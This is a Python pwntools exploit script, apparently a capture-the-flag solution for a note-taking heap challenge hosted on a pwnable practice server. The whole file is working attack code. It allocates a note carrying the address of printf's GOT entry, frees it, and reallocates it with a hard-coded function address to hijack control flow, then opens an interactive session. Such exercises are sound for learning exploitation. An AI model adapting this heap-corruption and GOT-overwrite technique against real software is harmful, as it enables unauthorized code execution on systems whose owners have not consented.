#!/usr/bin/python3
from pwn import *
elf = ELF("./challenge")

REMOTE = 1
DEBUG = 0

index = 0

def make_note(size, title, note):
    global index
    r.recvuntil(b"Exit\n> ")
    r.sendline(b"1")
    r.recvuntil(b": ")
    r.sendline(str(size))
    r.recvuntil(b": ")
    r.sendline(title)
    r.recvuntil(b": ")
    r.send(note)
    index += 1
    return index - 1

def edit_note(index, content):
    r.recvuntil(b"Exit\n> ")
    r.sendline(b"2")
    r.recvuntil(b"#: ")
    r.sendline(str(index))
    r.recvuntil(b": ")
    r.sendline(content)

def delete_note(index):
    print(r.recvuntil(b"Exit\n> "))
    r.sendline(b"3")
    r.recvuntil(b"#: ")
    r.sendline(str(index))
    index -= 1

def print_note(index):
    r.recvuntil(b"Exit\n> ")
    r.sendline(b"3")
    r.recvuntil(b"#: ")
    r.send(str(index))
    return r.recvline()

if REMOTE:
    r = remote("svc.pwnable.xyz", 30030)
elif DEBUG:
    gs = """
    b *make_note + 193
    continue
    continue
    """
    r = gdb.debug(elf.path, gdbscript=gs,)# api=True)
    #debug_r = r.gdb
else:
    r = process(elf.path)

make_note(0x28, "AAAABBBB", cyclic(0x20) + p32(elf.got.printf))

delete_note(0)

make_note(0x20, cyclic(0x10), p64(0x0000000000400970) + p64(0x0))

r.interactive()